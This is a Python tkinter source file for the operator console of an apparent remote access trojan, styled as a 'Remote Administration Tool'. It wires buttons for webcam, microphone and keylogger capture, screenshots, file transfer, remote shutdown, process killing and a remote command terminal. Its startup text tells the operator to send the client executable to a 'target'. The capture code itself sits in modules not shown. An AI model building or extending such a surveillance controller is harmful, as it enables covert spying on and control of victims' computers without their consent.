"""
server_gui.py - Main Entry Point
Run: python server_gui.py
"""
import sys, os
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog, simpledialog
import threading
import platform
from datetime import datetime

# ── Module imports ────────────────────────────────────────────────────────────
import gui_globals as g
from gui_globals import log_message
import gui_network as net
import gui_commands as cmds
import gui_features as feat

# ── log_message (global, accessible from all modules) ─────────────────────────
def log_message(message, level="INFO"):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
        tags = {"INFO": "info", "SUCCESS": "success", "ERROR": "error", "WARNING": "warning"}
        icons = {"INFO": "ℹ️ ", "SUCCESS": "✓ ", "ERROR": "✗ ", "WARNING": "⚠ "}
        tag = tags.get(level, "info")
        icon = icons.get(level, "  ")
        log_text.insert(tk.END, f"{icon}{message}\n", tag)
        log_text.after(50, lambda: log_text.see(tk.END))
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# MAIN WINDOW
# ══════════════════════════════════════════════════════════════════════════════
root = tk.Tk()
root.title("🖥️ Remote Administration Tool - Enterprise Edition v2.0")
root.geometry("1600x950")
root.configure(bg="#F5F5F5")
root.minsize(1400, 800)

# ── Menu Bar ──────────────────────────────────────────────────────────────────
menubar = tk.Menu(root)
root.config(menu=menubar)

file_menu = tk.Menu(menubar, tearoff=0)
menubar.add_cascade(label="File", menu=file_menu)
file_menu.add_command(label="📥 Download from Client", command=feat.download_file_from_client)
file_menu.add_command(label="📤 Upload to Client",     command=feat.upload_file_to_client)
file_menu.add_separator()
file_menu.add_command(label="💾 Save Terminal",        command=feat.save_terminal)
file_menu.add_separator()
file_menu.add_command(label="Exit",                    command=root.quit)

edit_menu = tk.Menu(menubar, tearoff=0)
menubar.add_cascade(label="Edit", menu=edit_menu)
edit_menu.add_command(label="Clear Terminal", command=feat.clear_terminal)
edit_menu.add_command(label="Clear Logs",     command=lambda: log_text.delete("1.0", tk.END))

tools_menu = tk.Menu(menubar, tearoff=0)
menubar.add_cascade(label="Tools", menu=tools_menu)
tools_menu.add_command(label="📸 Capture Screenshot", command=feat.capture_screenshot)
tools_menu.add_command(label="⌨️ Keylog Capture",    command=feat.capture_keylog)
tools_menu.add_command(label="💬 Send Popup",         command=feat.send_popup_message)
tools_menu.add_command(label="📊 System Info",        command=lambda: cmds.send_command_from_button("SYSINFO", "System Info"))

help_menu = tk.Menu(menubar, tearoff=0)
menubar.add_cascade(label="Help", menu=help_menu)
help_menu.add_command(label="About", command=feat.show_about)

# ── Top Bar ───────────────────────────────────────────────────────────────────
top_bar = tk.Frame(root, bg="#0D47A1", height=70)
top_bar.pack(fill="x")
top_bar.pack_propagate(False)

title_frame = tk.Frame(top_bar, bg="#0D47A1")
title_frame.pack(side="left", padx=25, pady=15)
tk.Label(title_frame, text="🖥️", font=("Segoe UI", 28), bg="#0D47A1", fg="#FFFFFF").pack(side="left", padx=(0, 15))
title_text = tk.Frame(title_frame, bg="#0D47A1")
title_text.pack(side="left")
tk.Label(title_text, text="Remote Administration Tool",        font=("Segoe UI", 18, "bold"), bg="#0D47A1", fg="#FFFFFF").pack(anchor="w")
tk.Label(title_text, text="Enterprise Edition v2.0 | Multi-Client", font=("Segoe UI", 9),  bg="#0D47A1", fg="#90CAF9").pack(anchor="w")

conn_frame = tk.Frame(top_bar, bg="#0D47A1")
conn_frame.pack(side="right", padx=25)

connect_btn    = tk.Button(conn_frame, text="🚀 Start Server",     command=net.start_server,             font=("Segoe UI", 11, "bold"), bg="#1976D2", fg="white", relief="flat", padx=25, pady=10, cursor="hand2")
stop_server_btn= tk.Button(conn_frame, text="⏹ Stop Server",       command=net.stop_server,              font=("Segoe UI", 11),        bg="#D32F2F", fg="white", relief="flat", padx=25, pady=10, cursor="hand2", state="disabled")
disconnect_btn = tk.Button(conn_frame, text="🔌 Disconnect Client", command=net.disconnect_active_client, font=("Segoe UI", 11),        bg="#FF6F00", fg="white", relief="flat", padx=20, pady=10, cursor="hand2", state="disabled")
connect_btn.pack(side="left", padx=5)
stop_server_btn.pack(side="left", padx=5)
disconnect_btn.pack(side="left", padx=5)

# ── Status Bar ────────────────────────────────────────────────────────────────
status_bar = tk.Frame(root, bg="#FFFFFF", height=45, relief="flat", bd=1)
status_bar.pack(fill="x")
status_bar.pack_propagate(False)

status_left = tk.Frame(status_bar, bg="#FFFFFF")
status_left.pack(side="left", padx=20, pady=10)
status_icon = tk.Label(status_left, text="⚪", font=("Segoe UI", 14), bg="#FFFFFF")
status_icon.pack(side="left", padx=(0, 10))
status_text = tk.Label(status_left, text="Not Connected", font=("Segoe UI", 11), bg="#FFFFFF", fg="#757575")
status_text.pack(side="left")

status_right = tk.Frame(status_bar, bg="#FFFFFF")
status_right.pack(side="right", padx=20, pady=10)
tk.Label(status_right, text=f"🌐 Port: {g.PORT}", font=("Segoe UI", 10), bg="#FFFFFF", fg="#757575").pack(side="left", padx=15)
tk.Label(status_right, text="●", font=("Segoe UI", 14), bg="#FFFFFF", fg="#66BB6A").pack(side="left", padx=5)
tk.Label(status_right, text="Ready",  font=("Segoe UI", 10), bg="#FFFFFF", fg="#757575").pack(side="left")

# ── Main Container ────────────────────────────────────────────────────────────
main_container = tk.Frame(root, bg="#F5F5F5")
main_container.pack(fill="both", expand=True)

# ── Left Panel ────────────────────────────────────────────────────────────────
left_panel_container = tk.Frame(main_container, bg="#FFFFFF", width=380, relief="flat", bd=1)
left_panel_container.pack(side="left", fill="y", padx=(15, 8), pady=15)
left_panel_container.pack_propagate(False)

left_canvas    = tk.Canvas(left_panel_container, bg="#FFFFFF", highlightthickness=0)
left_scrollbar = tk.Scrollbar(left_panel_container, orient="vertical", command=left_canvas.yview)
left_panel     = tk.Frame(left_canvas, bg="#FFFFFF")

left_scrollbar.pack(side="right", fill="y")
left_canvas.pack(side="left", fill="both", expand=True)
left_canvas.configure(yscrollcommand=left_scrollbar.set)
canvas_frame = left_canvas.create_window((0, 0), window=left_panel, anchor="nw")

def configure_scroll(event=None):
    left_canvas.configure(scrollregion=left_canvas.bbox("all"))
    left_canvas.itemconfig(canvas_frame, width=left_canvas.winfo_width())
left_panel.bind("<Configure>", configure_scroll)
left_canvas.bind("<Configure>", configure_scroll)

# Smooth scroll — works on canvas + ALL child widgets inside it
_scroll_speed = 3  # units per notch (higher = faster)

def on_left_wheel(event):
    """Smooth scrolling handler for left panel."""
    if event.delta:          # Windows & macOS
        units = int(-1 * (event.delta / 120)) * _scroll_speed
    elif event.num == 4:     # Linux scroll up
        units = -_scroll_speed
    else:                    # Linux scroll down
        units = _scroll_speed
    left_canvas.yview_scroll(units, "units")
    return "break"

def _bind_wheel_recursive(widget):
    """Bind mousewheel on every descendant so scroll works no matter where the cursor is."""
    widget.bind("<MouseWheel>",  on_left_wheel, add="+")  # Windows / macOS
    widget.bind("<Button-4>",    on_left_wheel, add="+")  # Linux scroll up
    widget.bind("<Button-5>",    on_left_wheel, add="+")  # Linux scroll down
    for child in widget.winfo_children():
        _bind_wheel_recursive(child)

_bind_wheel_recursive(left_canvas)
_bind_wheel_recursive(left_panel)

# Also re-bind whenever new widgets are added to left_panel
_orig_configure = configure_scroll
def configure_scroll(event=None):
    _orig_configure(event)
    _bind_wheel_recursive(left_panel)  # Catch any newly added buttons
left_panel.bind("<Configure>", configure_scroll)
left_canvas.bind("<Configure>", configure_scroll)

# ── Client List ───────────────────────────────────────────────────────────────
tk.Label(left_panel, text="👥 CONNECTED CLIENTS", font=("Segoe UI", 11, "bold"), bg="#FFFFFF", fg="#424242").pack(anchor="w", padx=20, pady=(20, 10))

client_list_frame = tk.Frame(left_panel, bg="#F5F5F5")
client_list_frame.pack(fill="x", padx=15, pady=(0, 20))
client_listbox = tk.Listbox(client_list_frame, font=("Segoe UI", 10), bg="#FAFAFA", fg="#212121", height=6,
                             relief="flat", selectbackground="#1976D2", selectforeground="white",
                             borderwidth=0, highlightthickness=1, highlightbackground="#E0E0E0")
client_listbox.pack(fill="x", padx=5, pady=5)
client_listbox.bind("<<ListboxSelect>>", net.on_client_select)
tk.Label(client_list_frame, text="Click to select active client", font=("Segoe UI", 9), bg="#F5F5F5", fg="#757575").pack(pady=(5, 10))

# ── Quick Commands ────────────────────────────────────────────────────────────
tk.Label(left_panel, text="⚡ QUICK COMMANDS", font=("Segoe UI", 11, "bold"), bg="#FFFFFF", fg="#424242").pack(anchor="w", padx=20, pady=(15, 10))
commands_container = tk.Frame(left_panel, bg="#FFFFFF")
commands_container.pack(fill="x", padx=15)

tk.Label(commands_container, text="Connect a client to see\nOS-specific commands",
         font=("Segoe UI", 10), bg="#FFFFFF", fg="#9E9E9E", justify="center").pack(pady=30)

# ── Advanced ──────────────────────────────────────────────────────────────────
adv_frame = tk.Frame(left_panel, bg="#E8EAF6")
adv_frame.pack(fill="x", padx=15, pady=(15, 10))
tk.Label(adv_frame, text="🚀 ADVANCED", font=("Segoe UI", 10, "bold"), bg="#E8EAF6", fg="#283593").pack(anchor="w", padx=12, pady=(12, 10))

adv_btns = [
    ("📸 Screenshot",  feat.capture_screenshot,        "#5E35B1"),
    ("📷 Webcam",      feat.capture_webcam,            "#E94560"),
    ("🎤 Microphone",  feat.capture_microphone,        "#00ACC1"),
    ("⌨️ Keylog",      feat.capture_keylog,            "#FF6F00"),
    ("📥 Download",    feat.download_file_from_client, "#00897B"),
    ("📤 Upload",      feat.upload_file_to_client,     "#6A1B9A"),
    ("💬 Send Popup",  feat.send_popup_message,        "#0277BD"),
]
advanced_buttons = []
for text, cmd, color in adv_btns:
    btn = tk.Button(adv_frame, text=text, command=cmd, font=("Segoe UI", 11, "bold"), bg=color, fg="white",
                    relief="flat", padx=18, pady=12, cursor="hand2", state="disabled", anchor="w",
                    activebackground=color, activeforeground="white")
    btn.pack(fill="x", padx=10, pady=4)
    advanced_buttons.append(btn)
g.keylog_button = advanced_buttons[3]
tk.Label(adv_frame, text="", bg="#E8EAF6").pack(pady=5)

# ── System Control ────────────────────────────────────────────────────────────
sys_frame = tk.Frame(left_panel, bg="#FFEBEE")
sys_frame.pack(fill="x", padx=15, pady=(15, 10))
tk.Label(sys_frame, text="⚙️ SYSTEM CONTROL", font=("Segoe UI", 10, "bold"), bg="#FFEBEE", fg="#C62828").pack(anchor="w", padx=12, pady=(12, 10))

sys_btns = [
    ("🔄 Restart System",   "RESTART", "#FF5722"),
    ("⏻ Shutdown System",  "SHUTDOWN", "#D32F2F"),
    ("🔒 Lock Workstation", "LOCK",    "#F57C00"),
]
for text, cmd, color in sys_btns:
    btn = tk.Button(sys_frame, text=text, command=lambda c=cmd, t=text: cmds.confirm_system_command(c, t),
                    font=("Segoe UI", 10, "bold"), bg=color, fg="white", relief="flat", padx=18, pady=11,
                    cursor="hand2", state="disabled", anchor="w", activebackground=color, activeforeground="white")
    btn.pack(fill="x", padx=10, pady=4)
    advanced_buttons.append(btn)
tk.Label(sys_frame, text="", bg="#FFEBEE").pack(pady=5)

# ── Process Control ───────────────────────────────────────────────────────────
proc_frame = tk.Frame(left_panel, bg="#E1F5FE")
proc_frame.pack(fill="x", padx=15, pady=(15, 20))
tk.Label(proc_frame, text="🎯 PROCESS CONTROL", font=("Segoe UI", 10, "bold"), bg="#E1F5FE", fg="#01579B").pack(anchor="w", padx=12, pady=(12, 10))

proc_btns = [
    ("🔍 Find Process", "FIND_PROCESS:", "#0288D1"),
    ("❌ Kill Process",  "KILL_PROCESS:", "#D32F2F"),
]
for text, cmd_prefix, color in proc_btns:
    btn = tk.Button(proc_frame, text=text, command=lambda cp=cmd_prefix, t=text: cmds.prompt_process_operation(cp, t),
                    font=("Segoe UI", 10, "bold"), bg=color, fg="white", relief="flat", padx=18, pady=11,
                    cursor="hand2", state="disabled", anchor="w", activebackground=color, activeforeground="white")
    btn.pack(fill="x", padx=10, pady=4)
    advanced_buttons.append(btn)
tk.Label(proc_frame, text="", bg="#E1F5FE").pack(pady=5)

# ── Right Panel ───────────────────────────────────────────────────────────────
right_panel = tk.Frame(main_container, bg="#F5F5F5")
right_panel.pack(side="right", fill="both", expand=True, padx=(8, 15), pady=15)
right_panel.grid_rowconfigure(0, weight=3)
right_panel.grid_rowconfigure(1, weight=1)
right_panel.grid_columnconfigure(0, weight=1)

# ── Terminal ──────────────────────────────────────────────────────────────────
terminal_section = tk.Frame(right_panel, bg="#FFFFFF", relief="solid", bd=2)
terminal_section.grid(row=0, column=0, sticky="nsew", pady=(0, 10))

terminal_header = tk.Frame(terminal_section, bg="#263238", height=55)
terminal_header.pack(fill="x")
terminal_header.pack_propagate(False)
tk.Label(terminal_header, text="💻 INTERACTIVE TERMINAL", font=("Segoe UI", 12, "bold"), bg="#263238", fg="#FFFFFF").pack(side="left", padx=20, pady=15)
tk.Label(terminal_header, text="Type commands | ↑↓ history | Tab complete", font=("Segoe UI", 10), bg="#263238", fg="#90A4AE").pack(side="left", padx=10)
tk.Button(terminal_header, text="💾", command=feat.save_terminal,  font=("Segoe UI", 12), bg="#263238", fg="#90CAF9", relief="flat", padx=12, cursor="hand2", borderwidth=0).pack(side="right", padx=8)
tk.Button(terminal_header, text="🗑️", command=feat.clear_terminal, font=("Segoe UI", 12), bg="#263238", fg="#90CAF9", relief="flat", padx=12, cursor="hand2", borderwidth=0).pack(side="right", padx=8)

cur_os = platform.system()
term_font = ("Consolas", 11) if cur_os == "Windows" else ("Courier New", 11)
term_bg   = "#000000"        if cur_os == "Windows" else "#1E1E1E"
term_fg   = "#00FF00"        if cur_os == "Windows" else "#C9D1D9"

terminal_output = scrolledtext.ScrolledText(terminal_section, font=term_font, bg=term_bg, fg=term_fg,
                                             insertbackground="#58A6FF", relief="flat", wrap="word",
                                             padx=25, pady=20, state="normal")
terminal_output.pack(fill="both", expand=True)

# Terminal colour tags
terminal_output.tag_config("prompt",    foreground="#00FF00", font=(term_font[0], 12, "bold"))
terminal_output.tag_config("command",   foreground="#FFFFFF", font=(term_font[0], 12, "bold"))
terminal_output.tag_config("output",    foreground=term_fg,   font=term_font)
terminal_output.tag_config("success",   foreground="#00FFFF", font=(term_font[0], 12, "bold"))
terminal_output.tag_config("error",     foreground="#FF0000", font=(term_font[0], 12, "bold"))
terminal_output.tag_config("warning",   foreground="#FFFF00", font=(term_font[0], 12))
terminal_output.tag_config("separator", foreground="#808080", font=term_font)
terminal_output.tag_config("loading",   foreground="#FFA657", font=(term_font[0], 11, "italic"))
terminal_output.tag_config("keylog",    foreground="#00FF88", font=(term_font[0], 11))

terminal_output.insert(tk.END, "Remote Administration Tool - Enterprise v2.0\n", "success")
terminal_output.insert(tk.END, "Click 'Start Server' then send client .exe to target.\n\n", "output")
terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
terminal_output.mark_set("input_start", "end-1c")
terminal_output.mark_gravity("input_start", "left")

# ── Terminal Key Bindings ─────────────────────────────────────────────────────
command_history = g.command_history

def on_terminal_key(event):
    try:
        with g.clients_lock:
            has_client = g.active_client_id and g.active_client_id in g.clients
        if not has_client:
            return "break"  # Disable typing if no client

        try:
            input_start_pos = terminal_output.index("input_start")
        except tk.TclError:
            return "break"

        # Ignore modifier keys
        if event.keysym in ("Shift_L", "Shift_R", "Control_L", "Control_R", "Alt_L", "Alt_R", "Caps_Lock"):
            return None

        # Execute Command
        if event.keysym == "Return":
            try:
                cmd = terminal_output.get("input_start", "end-1c").strip()
                if cmd:
                    command_history.append(cmd)
                    g.history_index = len(command_history)
                    terminal_output.insert(tk.END, "\n")
                    # -- DEBUG: visually confirm we are executing the command --
                    terminal_output.insert(tk.END, f"[System] Sending command: '{cmd}'...\n", "warning")
                    terminal_output.see(tk.END)
                    threading.Thread(target=cmds.execute_command, args=(cmd, cmd), daemon=True, name=f"FastCmd-{cmd[:15]}").start()
                else:
                    terminal_output.insert(tk.END, "\n")
                    terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
                    terminal_output.mark_set("input_start", "end-1c")
                    terminal_output.see(tk.END)
            except Exception as e:
                log_message(f"Command error: {e}", "ERROR")
            return "break"

        # Command History (Up/Down)
        elif event.keysym == "Up":
            if command_history and g.history_index > 0:
                g.history_index -= 1
                terminal_output.delete("input_start", "end")
                terminal_output.insert("input_start", command_history[g.history_index])
                terminal_output.mark_set("insert", "end")
            return "break"

        elif event.keysym == "Down":
            if command_history:
                if g.history_index < len(command_history) - 1:
                    g.history_index += 1
                    terminal_output.delete("input_start", "end")
                    terminal_output.insert("input_start", command_history[g.history_index])
                else:
                    g.history_index = len(command_history)
                    terminal_output.delete("input_start", "end")
                terminal_output.mark_set("insert", "end")
            return "break"

        # Prevent deleting/moving before the prompt
        elif event.keysym == "BackSpace":
            if terminal_output.compare("insert", "<=", "input_start"):
                return "break"
        elif event.keysym == "Left":
            if terminal_output.compare("insert", "<=", "input_start"):
                return "break"
        elif event.keysym == "Home":
            terminal_output.mark_set("insert", "input_start")
            return "break"

        # Shortcuts
        elif event.char == '\x03':  # Ctrl+C
            terminal_output.delete("input_start", "end")
            return "break"
        elif event.char == '\x16':  # Ctrl+V
            try:
                terminal_output.insert("end", root.clipboard_get())
                terminal_output.mark_set("insert", "end")
            except Exception:
                pass
            return "break"
        elif event.char == '\x0c':  # Ctrl+L
            feat.clear_terminal()
            return "break"

        # Force all other typing to go to the end of the line
        else:
            # If it's a printable character (length 1 and not a control char)
            if len(event.char) == 1 and ord(event.char) >= 32:
                if terminal_output.compare("insert", "<", "input_start"):
                    terminal_output.mark_set("insert", "end")
                terminal_output.insert("insert", event.char)
                terminal_output.see("end")
            return "break" # Manually handled, prevent default Tkinter typing issues

    except Exception as e:
        log_message(f"Terminal key error: {e}", "ERROR")
        return "break"

def show_terminal_context_menu(event):
    menu = tk.Menu(terminal_output, tearoff=0)
    menu.add_command(label="📋 Copy",  command=lambda: root.clipboard_append(terminal_output.get("sel.first", "sel.last")) if terminal_output.tag_ranges("sel") else None)
    menu.add_command(label="📄 Paste", command=lambda: terminal_output.insert("insert", root.clipboard_get()))
    menu.add_separator()
    menu.add_command(label="🗑️ Clear", command=feat.clear_terminal)
    menu.post(event.x_root, event.y_root)

terminal_output.bind("<Key>",     on_terminal_key)
terminal_output.bind("<Button-3>",show_terminal_context_menu)
terminal_output.focus()

# ── Activity Log ──────────────────────────────────────────────────────────────
log_section = tk.Frame(right_panel, bg="#263238", relief="solid", bd=2)
log_section.grid(row=1, column=0, sticky="nsew")

log_header = tk.Frame(log_section, bg="#37474F", height=50)
log_header.pack(fill="x")
log_header.pack_propagate(False)
tk.Label(log_header, text="📋 ACTIVITY LOG", font=("Segoe UI", 13, "bold"), bg="#37474F", fg="#FFFFFF").pack(side="left", padx=25, pady=14)
tk.Label(log_header, text="Real-time event monitoring", font=("Segoe UI", 9), bg="#37474F", fg="#B0BEC5").pack(side="left", padx=10)
tk.Button(log_header, text="🗑️ Clear", command=lambda: log_text.delete("1.0", tk.END),
          font=("Segoe UI", 10), bg="#37474F", fg="#90CAF9", relief="flat", padx=15, cursor="hand2", borderwidth=0).pack(side="right", padx=15)

log_text = scrolledtext.ScrolledText(log_section, font=("Segoe UI", 11), bg="#FAFAFA", fg="#424242",
                                      relief="flat", wrap="word", padx=25, pady=18, height=6, borderwidth=0)
log_text.pack(fill="both", expand=True, padx=2, pady=2)
log_text.tag_config("timestamp", foreground="#78909C", font=("Segoe UI", 10, "bold"))
log_text.tag_config("info",      foreground="#1976D2", font=("Segoe UI", 11, "bold"))
log_text.tag_config("success",   foreground="#388E3C", font=("Segoe UI", 11, "bold"))
log_text.tag_config("error",     foreground="#D32F2F", font=("Segoe UI", 11, "bold"))
log_text.tag_config("warning",   foreground="#F57C00", font=("Segoe UI", 11, "bold"))

# ══════════════════════════════════════════════════════════════════════════════
# Wire up gui_globals with widget references (MUST be after widget creation)
# ══════════════════════════════════════════════════════════════════════════════
g.root              = root
g.terminal_output   = terminal_output
g.log_text          = log_text
g.client_listbox    = client_listbox
g.status_icon       = status_icon
g.status_text       = status_text
g.connect_btn       = connect_btn
g.stop_server_btn   = stop_server_btn
g.disconnect_btn    = disconnect_btn
g.command_buttons   = []            # populated by update_commands_for_client_os
g.advanced_buttons  = advanced_buttons
g.commands_container= commands_container

# ── Start ─────────────────────────────────────────────────────────────────────
log_message("🚀 Application started", "SUCCESS")
log_message(f"🌐 Server ready on {g.HOST}:{g.PORT}", "INFO")
log_message("⏳ Click 'Start Server' to begin...", "INFO")

root.mainloop()
